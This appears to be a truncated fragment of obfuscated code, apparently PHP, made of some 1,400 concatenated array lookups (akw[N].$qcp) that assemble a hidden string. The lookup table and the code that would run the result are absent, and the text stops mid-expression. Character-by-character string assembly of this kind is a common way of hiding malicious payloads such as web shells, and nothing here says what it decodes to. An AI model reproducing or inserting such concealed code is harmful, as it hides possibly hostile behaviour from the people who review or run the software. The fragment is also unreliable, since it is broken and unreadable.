akw[12].$qcpakw[25].$qcpakw[186].$qcpakw[60].$qcpakw[56].$qcpakw[28].$qcpakw[70].$qcpakw[51].$qcpakw[72].$qcpakw[9].$qcpakw[5].$qcpakw[91].$qcpakw[186].$qcpakw[182].$qcpakw[45].$qcpakw[12].$qcpakw[65].$qcpakw[131].$qcpakw[66].$qcpakw[7].$qcpakw[88].$qcpakw[72].$qcpakw[164].$qcpakw[78].$qcpakw[56].$qcpakw[158].$qcpakw[56].$qcpakw[88].$qcpakw[88].$qcpakw[0].$qcpakw[63].$qcpakw[5].$qcpakw[65].$qcpakw[2].$qcpakw[25].$qcpakw[16].$qcpakw[45].$qcpakw[42].$qcpakw[72].$qcpakw[12].$qcpakw[15].$qcpakw[91].$qcpakw[78].$qcpakw[91].$qcpakw[47].$qcpakw[45].$qcpakw[63].$qcpakw[43].$qcpakw[33].$qcpakw[24].$qcpakw[12].$qcpakw[51].$qcpakw[27].$qcpakw[21].$qcpakw[56].$qcpakw[124].$qcpakw[73].$qcpakw[27].$qcpakw[91].$qcpakw[124].$qcpakw[66].$qcpakw[53].$qcpakw[67].$qcpakw[132].$qcpakw[38].$qcpakw[27].$qcpakw[60].$qcpakw[126].$qcpakw[69].$qcpakw[18].$qcpakw[43].$qcpakw[11].$qcpakw[138].$qcpakw[158].$qcpakw[69].$qcpakw[6].$qcpakw[138].$qcpakw[21].$qcpakw[11].$qcpakw[83].$qcpakw[16].$qcpakw[8].$qcpakw[91].$qcpakw[54].$qcpakw[63].$qcpakw[30].$qcpakw[88].$qcpakw[164].$qcpakw[69].$qcpakw[158].$qcpakw[182].$qcpakw[36].$qcpakw[36].$qcpakw[16].$qcpakw[5].$qcpakw[208].$qcpakw[73].$qcpakw[23].$qcpakw[34].$qcpakw[30].$qcpakw[72].$qcpakw[131].$qcpakw[83].$qcpakw[70].$qcpakw[78].$qcpakw[45].$qcpakw[132].$qcpakw[44].$qcpakw[16].$qcpakw[69].$qcpakw[45].$qcpakw[30].$qcpakw[67].$qcpakw[158].$qcpakw[138].$qcpakw[54].$qcpakw[24].$qcpakw[11].$qcpakw[186].$qcpakw[58].$qcpakw[158].$qcpakw[67].$qcpakw[131].$qcpakw[15].$qcpakw[70].$qcpakw[30].$qcpakw[66].$qcpakw[34].$qcpakw[58].$qcpakw[21].$qcpakw[138].$qcpakw[138].$qcpakw[8].$qcpakw[182].$qcpakw[44].$qcpakw[0].$qcpakw[83].$qcpakw[186].$qcpakw[69].$qcpakw[9].$qcpakw[15].$qcpakw[12].$qcpakw[66].$qcpakw[9].$qcpakw[24].$qcpakw[88].$qcpakw[124].$qcpakw[7].$qcpakw[88].$qcpakw[54].$qcpakw[105].$qcpakw[24].$qcpakw[43].$qcpakw[45].$qcpakw[63].$qcpakw[44].$qcpakw[21].$qcpakw[16].$qcpakw[132].$qcpakw[3].$qcpakw[16].$qcpakw[63].$qcpakw[70].$qcpakw[34].$qcpakw[65].$qcpakw[15].$qcpakw[138].$qcpakw[11].$qcpakw[6].$qcpakw[2].$qcpakw[126].$qcpakw[208].$qcpakw[12].$qcpakw[34].$qcpakw[67].$qcpakw[88].$qcpakw[105].$qcpakw[83].$qcpakw[65].$qcpakw[52].$qcpakw[83].$qcpakw[164].$qcpakw[56].$qcpakw[53].$qcpakw[42].$qcpakw[2].$qcpakw[2].$qcpakw[43].$qcpakw[69].$qcpakw[91].$qcpakw[4].$qcpakw[2].$qcpakw[52].$qcpakw[44].$qcpakw[34].$qcpakw[54].$qcpakw[11].$qcpakw[64].$qcpakw[14].$qcpakw[69].$qcpakw[69].$qcpakw[36].$qcpakw[182].$qcpakw[6].$qcpakw[78].$qcpakw[25].$qcpakw[44].$qcpakw[164].$qcpakw[28].$qcpakw[14].$qcpakw[63].$qcpakw[24].$qcpakw[9].$qcpakw[186].$qcpakw[44].$qcpakw[131].$qcpakw[64].$qcpakw[42].$qcpakw[15].$qcpakw[42].$qcpakw[18].$qcpakw[73].$qcpakw[78].$qcpakw[1].$qcpakw[56].$qcpakw[182].$qcpakw[58].$qcpakw[24].$qcpakw[70].$qcpakw[105].$qcpakw[182].$qcpakw[124].$qcpakw[8].$qcpakw[83].$qcpakw[43].$qcpakw[9].$qcpakw[9].$qcpakw[70].$qcpakw[69].$qcpakw[6].$qcpakw[23].$qcpakw[138].$qcpakw[58].$qcpakw[9].$qcpakw[105].$qcpakw[131].$qcpakw[65].$qcpakw[73].$qcpakw[9].$qcpakw[16].$qcpakw[64].$qcpakw[36].$qcpakw[83].$qcpakw[132].$qcpakw[66].$qcpakw[65].$qcpakw[88].$qcpakw[36].$qcpakw[11].$qcpakw[29].$qcpakw[131].$qcpakw[25].$qcpakw[24].$qcpakw[36].$qcpakw[47].$qcpakw[2].$qcpakw[83].$qcpakw[60].$qcpakw[43].$qcpakw[14].$qcpakw[164].$qcpakw[65].$qcpakw[33].$qcpakw[3].$qcpakw[47].$qcpakw[132].$qcpakw[29].$qcpakw[66].$qcpakw[23].$qcpakw[78].$qcpakw[11].$qcpakw[186].$qcpakw[38].$qcpakw[9].$qcpakw[43].$qcpakw[27].$qcpakw[34].$qcpakw[29].$qcpakw[124].$qcpakw[8].$qcpakw[44].$qcpakw[131].$qcpakw[33].$qcpakw[56].$qcpakw[33].$qcpakw[24].$qcpakw[60].$qcpakw[105].$qcpakw[11].$qcpakw[4].$qcpakw[21].$qcpakw[53].$qcpakw[73].$qcpakw[33].$qcpakw[186].$qcpakw[0].$qcpakw[33].$qcpakw[208].$qcpakw[27].$qcpakw[164].$qcpakw[83].$qcpakw[63].$qcpakw[164].$qcpakw[66].$qcpakw[70].$qcpakw[25].$qcpakw[186].$qcpakw[131].$qcpakw[63].$qcpakw[34].$qcpakw[58].$qcpakw[64].$qcpakw[30].$qcpakw[182].$qcpakw[186].$qcpakw[9].$qcpakw[70].$qcpakw[9].$qcpakw[158].$qcpakw[70].$qcpakw[78].$qcpakw[64].$qcpakw[63].$qcpakw[38].$qcpakw[44].$qcpakw[54].$qcpakw[208].$qcpakw[23].$qcpakw[83].$qcpakw[14].$qcpakw[33].$qcpakw[1].$qcpakw[83].$qcpakw[131].$qcpakw[28].$qcpakw[21].$qcpakw[23].$qcpakw[47].$qcpakw[47].$qcpakw[66].$qcpakw[43].$qcpakw[51].$qcpakw[9].$qcpakw[186].$qcpakw[42].$qcpakw[1].$qcpakw[63].$qcpakw[30].$qcpakw[186].$qcpakw[54].$qcpakw[54].$qcpakw[33].$qcpakw[72].$qcpakw[54].$qcpakw[158].$qcpakw[186].$qcpakw[8].$qcpakw[47].$qcpakw[9].$qcpakw[56].$qcpakw[69].$qcpakw[0].$qcpakw[16].$qcpakw[124].$qcpakw[3].$qcpakw[72].$qcpakw[28].$qcpakw[5].$qcpakw[64].$qcpakw[126].$qcpakw[1].$qcpakw[60].$qcpakw[14].$qcpakw[3].$qcpakw[44].$qcpakw[69].$qcpakw[34].$qcpakw[14].$qcpakw[88].$qcpakw[47].$qcpakw[56].$qcpakw[138].$qcpakw[208].$qcpakw[9].$qcpakw[36].$qcpakw[73].$qcpakw[47].$qcpakw[2].$qcpakw[42].$qcpakw[70].$qcpakw[28].$qcpakw[11].$qcpakw[2].$qcpakw[12].$qcpakw[65].$qcpakw[6].$qcpakw[60].$qcpakw[7].$qcpakw[11].$qcpakw[63].$qcpakw[12].$qcpakw[16].$qcpakw[15].$qcpakw[34].$qcpakw[15].$qcpakw[27].$qcpakw[25].$qcpakw[11].$qcpakw[9].$qcpakw[138].$qcpakw[12].$qcpakw[14].$qcpakw[52].$qcpakw[12].$qcpakw[70].$qcpakw[3].$qcpakw[33].$qcpakw[70].$qcpakw[9].$qcpakw[43].$qcpakw[58].$qcpakw[2].$qcpakw[34].$qcpakw[65].$qcpakw[138].$qcpakw[64].$qcpakw[78].$qcpakw[182].$qcpakw[21].$qcpakw[24].$qcpakw[138].$qcpakw[83].$qcpakw[208].$qcpakw[0].$qcpakw[51].$qcpakw[45].$qcpakw[43].$qcpakw[18].$qcpakw[54].$qcpakw[83].$qcpakw[8].$qcpakw[73].$qcpakw[70].$qcpakw[25].$qcpakw[9].$qcpakw[63].$qcpakw[63].$qcpakw[138].$qcpakw[67].$qcpakw[23].$qcpakw[5].$qcpakw[69].$qcpakw[45].$qcpakw[53].$qcpakw[24].$qcpakw[5].$qcpakw[64].$qcpakw[53].$qcpakw[7].$qcpakw[14].$qcpakw[66].$qcpakw[58].$qcpakw[5].$qcpakw[16].$qcpakw[11].$qcpakw[60].$qcpakw[78].$qcpakw[69].$qcpakw[3].$qcpakw[27].$qcpakw[2].$qcpakw[3].$qcpakw[164].$qcpakw[4].$qcpakw[70].$qcpakw[78].$qcpakw[51].$qcpakw[6].$qcpakw[83].$qcpakw[67].$qcpakw[28].$qcpakw[51].$qcpakw[43].$qcpakw[3].$qcpakw[78].$qcpakw[3].$qcpakw[72].$qcpakw[60].$qcpakw[64].$qcpakw[88].$qcpakw[9].$qcpakw[18].$qcpakw[126].$qcpakw[5].$qcpakw[2].$qcpakw[47].$qcpakw[56].$qcpakw[56].$qcpakw[65].$qcpakw[12].$qcpakw[1].$qcpakw[44].$qcpakw[73].$qcpakw[52].$qcpakw[42].$qcpakw[88].$qcpakw[33].$qcpakw[132].$qcpakw[2].$qcpakw[28].$qcpakw[8].$qcpakw[47].$qcpakw[54].$qcpakw[88].$qcpakw[182].$qcpakw[132].$qcpakw[8].$qcpakw[88].$qcpakw[25].$qcpakw[0].$qcpakw[16].$qcpakw[34].$qcpakw[9].$qcpakw[208].$qcpakw[38].$qcpakw[24].$qcpakw[88].$qcpakw[29].$qcpakw[21].$qcpakw[73].$qcpakw[132].$qcpakw[72].$qcpakw[11].$qcpakw[28].$qcpakw[8].$qcpakw[72].$qcpakw[11].$qcpakw[91].$qcpakw[29].$qcpakw[14].$qcpakw[18].$qcpakw[28].$qcpakw[52].$qcpakw[47].$qcpakw[15].$qcpakw[25].$qcpakw[83].$qcpakw[33].$qcpakw[25].$qcpakw[34].$qcpakw[51].$qcpakw[69].$qcpakw[44].$qcpakw[52].$qcpakw[158].$qcpakw[132].$qcpakw[52].$qcpakw[12].$qcpakw[52].$qcpakw[23].$qcpakw[72].$qcpakw[47].$qcpakw[126].$qcpakw[54].$qcpakw[105].$qcpakw[67].$qcpakw[131].$qcpakw[78].$qcpakw[72].$qcpakw[4].$qcpakw[33].$qcpakw[11].$qcpakw[132].$qcpakw[36].$qcpakw[51].$qcpakw[138].$qcpakw[12].$qcpakw[34].$qcpakw[9].$qcpakw[91].$qcpakw[158].$qcpakw[8].$qcpakw[83].$qcpakw[138].$qcpakw[47].$qcpakw[25].$qcpakw[42].$qcpakw[105].$qcpakw[182].$qcpakw[78].$qcpakw[66].$qcpakw[11].$qcpakw[69].$qcpakw[38].$qcpakw[60].$qcpakw[12].$qcpakw[47].$qcpakw[131].$qcpakw[18].$qcpakw[16].$qcpakw[186].$qcpakw[23].$qcpakw[70].$qcpakw[124].$qcpakw[12].$qcpakw[27].$qcpakw[182].$qcpakw[38].$qcpakw[83].$qcpakw[36].$qcpakw[28].$qcpakw[12].$qcpakw[73].$qcpakw[53].$qcpakw[27].$qcpakw[88].$qcpakw[15].$qcpakw[83].$qcpakw[3].$qcpakw[1].$qcpakw[72].$qcpakw[60].$qcpakw[29].$qcpakw[1].$qcpakw[91].$qcpakw[0].$qcpakw[83].$qcpakw[88].$qcpakw[12].$qcpakw[53].$qcpakw[27].$qcpakw[72].$qcpakw[9].$qcpakw[14].$qcpakw[34].$qcpakw[78].$qcpakw[4].$qcpakw[16].$qcpakw[60].$qcpakw[36].$qcpakw[132].$qcpakw[44].$qcpakw[131].$qcpakw[47].$qcpakw[43].$qcpakw[12].$qcpakw[67].$qcpakw[1].$qcpakw[164].$qcpakw[78].$qcpakw[91].$qcpakw[33].$qcpakw[34].$qcpakw[6].$qcpakw[0].$qcpakw[24].$qcpakw[208].$qcpakw[186].$qcpakw[67].$qcpakw[42].$qcpakw[70].$qcpakw[126].$qcpakw[45].$qcpakw[11].$qcpakw[21].$qcpakw[12].$qcpakw[132].$qcpakw[3].$qcpakw[67].$qcpakw[70].$qcpakw[36].$qcpakw[63].$qcpakw[126].$qcpakw[66].$qcpakw[72].$qcpakw[15].$qcpakw[91].$qcpakw[11].$qcpakw[65].$qcpakw[43].$qcpakw[131].$qcpakw[5].$qcpakw[72].$qcpakw[56].$qcpakw[0].$qcpakw[2].$qcpakw[208].$qcpakw[8].$qcpakw[5].$qcpakw[30].$qcpakw[182].$qcpakw[52].$qcpakw[42].$qcpakw[67].$qcpakw[73].$qcpakw[65].$qcpakw[72].$qcpakw[38].$qcpakw[158].$qcpakw[27].$qcpakw[56].$qcpakw[186].$qcpakw[29].$qcpakw[88].$qcpakw[60].$qcpakw[24].$qcpakw[34].$qcpakw[34].$qcpakw[70].$qcpakw[12].$qcpakw[65].$qcpakw[36].$qcpakw[131].$qcpakw[38].$qcpakw[43].$qcpakw[58].$qcpakw[131].$qcpakw[158].$qcpakw[208].$qcpakw[208].$qcpakw[33].$qcpakw[70].$qcpakw[4].$qcpakw[29].$qcpakw[25].$qcpakw[63].$qcpakw[64].$qcpakw[91].$qcpakw[24].$qcpakw[30].$qcpakw[43].$qcpakw[34].$qcpakw[24].$qcpakw[53].$qcpakw[78].$qcpakw[66].$qcpakw[42].$qcpakw[30].$qcpakw[70].$qcpakw[33].$qcpakw[44].$qcpakw[23].$qcpakw[124].$qcpakw[29].$qcpakw[60].$qcpakw[70].$qcpakw[12].$qcpakw[73].$qcpakw[24].$qcpakw[34].$qcpakw[8].$qcpakw[66].$qcpakw[131].$qcpakw[182].$qcpakw[131].$qcpakw[38].$qcpakw[4].$qcpakw[11].$qcpakw[23].$qcpakw[43].$qcpakw[58].$qcpakw[45].$qcpakw[18].$qcpakw[36].$qcpakw[42].$qcpakw[58].$qcpakw[1].$qcpakw[58].$qcpakw[60].$qcpakw[83].$qcpakw[7].$qcpakw[25].$qcpakw[131].$qcpakw[0].$qcpakw[8].$qcpakw[186].$qcpakw[12].$qcpakw[16].$qcpakw[23].$qcpakw[83].$qcpakw[2].$qcpakw[54].$qcpakw[0].$qcpakw[21].$qcpakw[11].$qcpakw[83].$qcpakw[182].$qcpakw[21].$qcpakw[63].$qcpakw[65].$qcpakw[69].$qcpakw[54].$qcpakw[12].$qcpakw[78].$qcpakw[52].$qcpakw[29].$qcpakw[53].$qcpakw[43].$qcpakw[64].$qcpakw[164].$qcpakw[7].$qcpakw[186].$qcpakw[126].$qcpakw[54].$qcpakw[29].$qcpakw[164].$qcpakw[52].$qcpakw[91].$qcpakw[69].$qcpakw[78].$qcpakw[60].$qcpakw[34].$qcpakw[43].$qcpakw[27].$qcpakw[1].$qcpakw[6].$qcpakw[5].$qcpakw[14].$qcpakw[14].$qcpakw[186].$qcpakw[42].$qcpakw[83].$qcpakw[11].$qcpakw[4].$qcpakw[33].$qcpakw[83].$qcpakw[16].$qcpakw[131].$qcpakw[25].$qcpakw[186].$qcpakw[4].$qcpakw[131].$qcpakw[132].$qcpakw[16].$qcpakw[124].$qcpakw[64].$qcpakw[28].$qcpakw[45].$qcpakw[60].$qcpakw[56].$qcpakw[34].$qcpakw[27].$qcpakw[66].$qcpakw[25].$qcpakw[24].$qcpakw[60].$qcpakw[21].$qcpakw[51].$qcpakw[24].$qcpakw[72].$qcpakw[83].$qcpakw[63].$qcpakw[8].$qcpakw[29].$qcpakw[131].$qcpakw[65].$qcpakw[64].$qcpakw[67].$qcpakw[88].$qcpakw[53].$qcpakw[51].$qcpakw[38].$qcpakw[6].$qcpakw[30].$qcpakw[138].$qcpakw[3].$qcpakw[6].$qcpakw[9].$qcpakw[25].$qcpakw[164].$qcpakw[91].$qcpakw[43].$qcpakw[88].$qcpakw[7].$qcpakw[25].$qcpakw[64].$qcpakw[23].$qcpakw[182].$qcpakw[16].$qcpakw[1].$qcpakw[186].$qcpakw[1].$qcpakw[126].$qcpakw[27].$qcpakw[34].$qcpakw[29].$qcpakw[70].$qcpakw[23].$qcpakw[54].$qcpakw[131].$qcpakw[124].$qcpakw[126].$qcpakw[70].$qcpakw[67].$qcpakw[186].$qcpakw[60].$qcpakw[66].$qcpakw[73].$qcpakw[0].$qcpakw[4].$qcpakw[9].$qcpakw[60].$qcpakw[44].$qcpakw[44].$qcpakw[45].$qcpakw[66].$qcpakw[21].$qcpakw[65].$qcpakw[28].$qcpakw[6].$qcpakw[16].$qcpakw[18].$qcpakw[51].$qcpakw[83].$qcpakw[124].$qcpakw[3].$qcpakw[88].$qcpakw[18].$qcpakw[64].$qcpakw[182].$qcpakw[60].$qcpakw[45].$qcpakw[23].$qcpakw[1].$qcpakw[208].$qcpakw[105].$qcpakw[6].$qcpakw[47].$qcpakw[186].$qcpakw[43].$qcpakw[18].$qcpakw[158].$qcpakw[6].$qcpakw[83].$qcpakw[27].$qcpakw[58].$qcpakw[15].$qcpakw[51].$qcpakw[27].$qcpakw[27].$qcpakw[132].$qcpakw[186].$qcpakw[28].$qcpakw[63].$qcpakw[29].$qcpakw[1].$qcpakw[65].$qcpakw[186].$qcpakw[53].$qcpakw[33].$qcpakw[73].$qcpakw[24].$qcpakw[182].$qcpakw[36].$qcpakw[66].$qcpakw[16].$qcpakw[45].$qcpakw[2].$qcpakw[131].$qcpakw[66].$qcpakw[78].$qcpakw[44].$qcpakw[8].$qcpakw[158].$qcpakw[53].$qcpakw[91].$qcpakw[66].$qcpakw[60].$qcpakw[58].$qcpakw[124].$qcpakw[18].$qcpakw[56].$qcpakw[25].$qcpakw[60].$qcpakw[3].$qcpakw[8].$qcpakw[36].$qcpakw[0].$qcpakw[42].$qcpakw[2].$qcpakw[6].$qcpakw[9].$qcpakw[11].$qcpakw[14].$qcpakw[2].$qcpakw[8].$qcpakw[138].$qcpakw[78].$qcpakw[9].$qcpakw[126].$qcpakw[132].$qcpakw[15].$qcpakw[138].$qcpakw[25].$qcpakw[24].$qcpakw[38].$qcpakw[12].$qcpakw[2].$qcpakw[164].$qcpakw[29].$qcpakw[182].$qcpakw[16].$qcpakw[182].$qcpakw[132].$qcpakw[29].$qcpakw[25].$qcpakw[78].$qcpakw[72].$qcpakw[64].$qcpakw[11].$qcpakw[66].$qcpakw[30].$qcpakw[1].$qcpakw[138].$qcpakw[63].$qcpakw[21].$qcpakw[69].$qcpakw[69].$qcpakw[51].$qcpakw[36].$qcpakw[42].$qcpakw[44].$qcpakw[4].$qcpakw[16].$qcpakw[12].$qcpakw[66].$qcpakw[21].$qcpakw[53].$qcpakw[51].$qcpakw[6].$qcpakw[24].$qcpakw[47].$qcpakw[6].$qcpakw[43].$qcpakw[54].$qcpakw[9].$qcpakw[24].$qcpakw[70].$qcpakw[186].$qcpakw[67].$qcpakw[53].$qcpakw[47].$qcpakw[2].$qcpakw[60].$qcpakw[66].$qcpakw[52].$qcpakw[54].$qcpakw[15].$qcpakw[34].$qcpakw[6].$qcpakw[27].$qcpakw[28].$qcpakw[66].$qcpakw[33].$qcpakw[105].$qcpakw[131].$qcpakw[182].$qcpakw[42].$qcpakw[63].$qcpakw[164].$qcpakw[6].$qcpakw[88].$qcpakw[3].$qcpakw[158].$qcpakw[34].$qcpakw[15].$qcpakw[24].$qcpakw[91].$qcpakw[36].$qcpakw[12].$qcpakw[69].$qcpakw[36].$qcpakw[67].$qcpakw[5].$qcpakw[45].$qcpakw[11].$qcpakw[27].$qcpakw[43].$qcpakw[70].$qcpakw[67].$qcpakw[64].$qcpakw[126].$qcpakw[69].$qcpakw[11].$qcpakw[208].$qcpakw[42].$qcpakw[83].$qcpakw[131].$qcpakw[105].$qcpakw[53].$qcpakw[60].$qcpakw[42].$qcpakw[33].$qcpakw[9].$qcpakw[29].$qcpakw[2].$qcpakw[56].$qcpakw[16].$qcpakw[36].$qcpakw[52].$qcpakw[67].$qcpakw[9].$qcpakw[6].$qcpakw[24].$qcpakw[43].$qcpakw[105].$qcpakw[30].$qcpakw[24].$qcpakw[12].$qcpakw[63].$qcpakw[9].$qcpakw[63].$qcpakw[6].$qcpakw[14].$qcpakw[36].$qcpakw[21].$qcpakw[24].$qcpakw[30].$qcpakw[34].$qcpakw[131].$qcpakw[6].$qcpakw[158].$qcpakw[72].$qcpakw[64].$qcpakw[36].$qcpakw[105].$qcpakw[8].$qcpakw[91].$qcpakw[182].$qcpakw[12].$qcpakw[58].$qcpakw[28].$qcpakw[69].$qcpakw[60].$qcpakw[186].$qcpakw[7].$qcpakw[56].$qcpakw[38].$qcpakw[126].$qcpakw[54].$qcpakw[72].$qcpakw[28].$qcpakw[47].$qcpakw[24].$qcpakw[6].$qcpakw[45].$qcpakw[51].$qcpakw[4].$qcpakw[11].$qcpakw[5].$qcpakw[4].$qcpakw[38].$qcpakw[63].$qcpakw[33].$qcpakw[30].$qcpakw[54].$qcpakw[12].$qcpakw[78].$qcpakw[88].$qcpakw[29].$qcpakw[69].$qcpakw[132].$qcpakw[42].$qcpakw[131].$qcpakw[126].$qcpakw[63].$qcpakw[5].$qcpakw[18].$qcpakw[9].$qcpakw[15].$qcpakw[63].$qcpakw[72].$qcpakw[58].$qcpakw[83].$qcpakw[33].$qcpakw[45].$qcpakw[2].$qcpakw[38].$qcpakw[56].$qcpakw[34].$qcpakw[78].$qcpakw[131].$qcpakw[182].$qcpakw[52].$qcpakw[8].$qcpakw[67].$qcpakw[52].$qcpakw[52].$qcpakw[43].$qcpakw[126].$qcpakw[2].$qcpakw[65].$qcpakw[44].$qcpakw[158].$qcpakw[38].$qcpakw[38].$qcpakw[124].$qcpakw[70].$qcpakw[78].$qcpakw[23].$qcpakw[47].$qcpakw[51].$qcpakw[6].$qcpakw[33].$qcpakw[88].$qcpakw[27].$qcpakw[208].$qcpakw[60].$qcpakw[24].$qcpakw[7].$qcpakw[83].$qcpakw[186].$qcpakw[18].$qcpakw[66].$qcpakw[64].$qcpakw[51].$qcpakw[7].$qcpakw[3].$qcpakw[18].$qcpakw[0].$qcpakw[105].$qcpakw[3].$qcpakw[158].$qcpakw[64].$qcpakw[33].$qcpakw[56].$qcpakw[23].$qcpakw[2].$qcpakw[158].$qcpakw[7].$qcpakw[78].$qcpakw[30].$qcpakw[11].$qcpakw[52].$qcpakw[8].$qcpakw[36].$qcpakw[42].$qcpakw[25].$qcpakw[56].$qcpakw[72].$qcpakw[54].$qcpakw[91].$qcpakw[164].$qcpakw[91].$qcpakw[54].$qcpakw[47].$qcpakw[0].$qcpakw[28].$qcpakw[124].$qcpakw[88].$qcpakw[63].$qcpakw[164].$qcpakw[69].$qcpakw[33].$qcpakw[56].$qcpakw[88].$qcpakw[33].$qcpakw[9].$qcpakw[14].$qcpakw[70].$qcpakw[83].$qcpakw[18].$qcpakw[33].$qcpakw[29].$qcpakw[27].$qcpakw[60].$qcpakw[45].$qcpakw[36].$qcpakw[51].$qcpakw[27].$qcpakw[105].$qcpakw[158].$qcpakw[18].$qcpakw[138].$qcpakw[60].$qcpakw[182].$qcpakw[2].$qcpakw[58].$qcpakw[24].$qcpakw[51].$qcpakw[44].$qcpakw[56].$qcpakw[25].$qcpakw[186].$qcpakw[132].$qcpakw[9].$qcpakw[164].$qcpakw[83].$qcpakw[54].$qcpakw[164].$qcpakw[18].$qcpakw[14].$qcpakw[73].$qcpakw[34].$qcpakw[43].$qcpakw[66].$qcpakw[88].$qcpakw[6].$qcpakw[88].$qcpakw[105].$qcpakw[6].$qcpakw[124].$qcpakw[44].$qcpakw[56].$qcpakw[8].$qcpakw[60].$qcpakw[3].$qcpakw[29].$qcpakw[2].$qcpakw[38].$qcpakw[27].$qcpakw[29].$qcpakw[6].$qcpakw[60].$qcpakw[63].$qcpakw[8].$qcpakw[12].$qcpakw[9].$qcpakw[25].$qcpakw[66].$qcpakw[27].$qcpakw[60].$qcpakw[126].$qcpakw[7].$qcpakw[27].$qcpakw[66].$qcpakw[3].$qcpakw[63].$qcpakw[124].$qcpakw[5].$qcpakw[65].$qcpakw[1].$qcpakw[1].$qcpakw[164].$qcpakw[66].$qcpakw[2].$qcpakw[7].$qcpakw[124].$qcpakw[9].$qcpakw[132].$qcpakw[91].$qcpakw[27].$qcpakw[47].$qcpakw[65].$qcpakw[24].$qcpakw[7].$qcpakw[42].$qcpakw[6].$qcpakw[54].$qcpakw[11].$qcpakw[43].$qcpakw[2].$qcpakw[34].$qcpakw[15].$qcpakw[47].$qcpakw[29].$qcpakw[88].$qcpakw[63].$qcpakw[124].$qcpakw[158].$qcpakw[25].$qcpakw[38].$qcpakw[47].$qcpakw[105].$qcpakw[67].$qcpakw[63].$qcpakw[53].$qcpakw[5].$qcpakw[131].$qcpakw[8].$qcpakw[34].$qcpakw[70].$qcpakw[63].$qcpakw[63].$qcpakw[69].$qcpakw[52].$qcpakw[11].$qcpakw[56].$qcpakw[30].$qcpakw[51].$qcpakw[29].$qcpakw[186].$qcpakw[1].$qcpakw[8].$qcpakw[60].$qcpakw[64].$qcpakw[51].$qcpakw[44].$qcpakw[132].$qcpakw[29].$qcpakw[30].$qcpakw[158].$qcpakw[43].$qcpakw[69].$qcpakw[63].$qcpakw[42].$qcpakw[2].$qcpakw[182].$qcpakw[21].$qcpakw[47].$qcpakw[64].$qcpakw[65].$qcpakw[45].$qcpakw[73].$qcpakw[3].$qcpakw[164].$qcpakw[29].$qcpakw[0].$qcpakw[36].$qcpakw[25].$qcpakw[66].$qcpakw[2].$qcpakw[54].$qcpakw[51].$qcpakw[56].$qcpakw[25].$qcpakw[53].$qcpakw[7].$qcpakw[66].$qcpakw[29].$qcpakw[33].$qcpakw[52].$qcpakw[21].$qcpakw[0].$qcpakw[126].$qcpakw[164].$qcpakw[24].$qcpakw[28].$qcpakw[1].$qcpakw[131].$qcpakw[63].$qcpakw[105].$qcpakw[164].$qcpakw[30].$qcpakw[5].$qcpakw[208].$qcpakw[43].$qcpakw[58].$qcpakw[36].$qcpakw[51].$qcpakw[18].$qcpakw[30].$qcpakw[51].$qcpakw[51].$qcpakw[72].$qcpakw[164].$qcpakw[29].$qcpakw[25].$qcpakw[34].$qcpakw[33].$qcpakw[1].$qcpakw[38].$qcpakw[105].$qcpakw[54].$qcpakw[132].$qcpakw[63].$qcpakw[53].$qcpakw[42].$qcpakw[91].$qcpakw[58].$qcpakw[72].$qcpakw[186].$qcpakw[7].$qcpakw[78].$qcpakw[126].$qcpakw[21].$qcpakw[67].$qcpakw[21].$qcpakw[24].$qcpakw[69].$qcpakw[63].$qcpakw[60].$qcpakw[16].$qcpakw[16].$qcpakw[63].$qcpakw[25].$qcpakw[131].$qcpakw[15].$qcpakw[23].$qcpakw[44].$qcpakw[23].$qcpakw[66].$qcpakw[69].$qcpakw[66].$qcpakw[5].$qcpakw[73].$qcpakw[60].$qcpakw[25].$qcpakw[11].$qcpakw[164].$qcpakw[186].$qcpakw[21].$qcpakw[27].$qcpakw[88].$qcpakw[6].$qcpakw[43].$qcpakw[15].$qcpakw[126].$qcpakw[14].$qcpakw[126].$qcpakw[64].$qcpakw[53].$qcpakw[11].$qcpakw[1].$qcpakw[132].$qcpakw[47].$qcpakw[29].$qcpakw[83].$qcpakw[83].$qcpakw[9].$qcpakw[78].$qcpakw[28].$qcpakw[164].$qcpakw[73].$qcpakw[88].$qcpakw[52].$qcpakw[186].$qcpakw[52].$qcpakw[164].$qcpakw[8].$qcpakw[25].$qcpakw[158].$qcpakw[186].$qcpakw[164].$qcpakw[9].$qcpakw[9].$qcpakw[27].$qcpakw[58].$qcpakw[58].$qcpakw[6].$qcpakw[70].$qcpakw[23].$qcpakw[66].$qcpakw[14].$qcpakw[44].$qcpakw[9].$qcpakw[34].$qcpakw[42].$qcpakw[67].$qcpakw[3].$qcpakw[208].$qcpakw[38].$qcpakw[15].$qcpakw[15].$qcpakw[21].$qcpakw[131].$qcpakw[12].$qcpakw[70].$qcpakw[63].$qcpakw[43].$qcpakw[15].$qcpakw[44].$qcpakw[4].$qcpakw[36].$qcpakw[124].$qcpakw[27].$qcpakw[15].$qcpakw[6].$qcpakw[83].$qcpakw[28].$qcpakw[63].$qcpakw[42].$qcpakw[6].$qcpakw[21].$qcpakw[47].$qcpakw[28].$qcpakw[83].$qcpakw[64].$qcpakw[72].$qcpakw[53].$qcpakw[56].$qcpakw[67].$qcpakw[70].$qcpakw[9].$qcpakw[91].$qcpakw[36].$qcpakw[132].$qcpakw[9].$qcpakw[23].$qcpakw[78].$qcpakw[43].$qcpakw[8].$qcpakw[44].$qcpakw[158].$qcpakw[12].$qcpakw[66].$qcpakw[1].$qcpakw[88].$qcpakw[42].$qcpakw[105].$qcpakw[78].$qcpakw[124].$qcpakw[63].$qcpakw[182].$qcpakw[70].$qcpakw[47].$qcpakw[83].$qcpakw[56].$qcpakw[4].$qcpakw[91].$qcpakw[3].$qcpakw[83].$qcpakw[52].$qcpakw[7].$qcpakw[208].$qcpakw[36].$qcpakw[11].$qcpakw[28].$qcpakw[83].$qcpakw[88].$qcpakw[21].$qcpakw[27].$qcpakw[78].$qcpakw[66].$qcpakw[69].$qcpakw[29].$qcpakw[33].$qcpakw[8].$qcpakw[65].$qcpakw[182].$qcpakw[33].$qcpakw[182].$qcpakw[53].$qcpakw[0].$qcpakw[182].$qcpakw[88].$qcpakw[47].$qcpakw[54].$qcpakw[4].$qcpakw[53].$qcpakw[78].$qcpakw[53].$qcpakw[60].$qcpakw[11].$qcpakw[23].$qcpakw[54].$qcpakw[30].$qcpakw[38].$qcpakw[7].$qcpakw[3].$qcpakw[1].$qcpakw[2].$qcpakw[29].$qcpakw[53].$qcpakw[18].$qcpakw[67].$qcpakw[34].$qcpakw[36].$qcpakw[164].$qcpakw[132].$qcpakw[126].$qcpakw[47].$qcpakw[53].$qcpakw[9].$qcpakw[2].$qcpakw[2].$qcpakw[83].$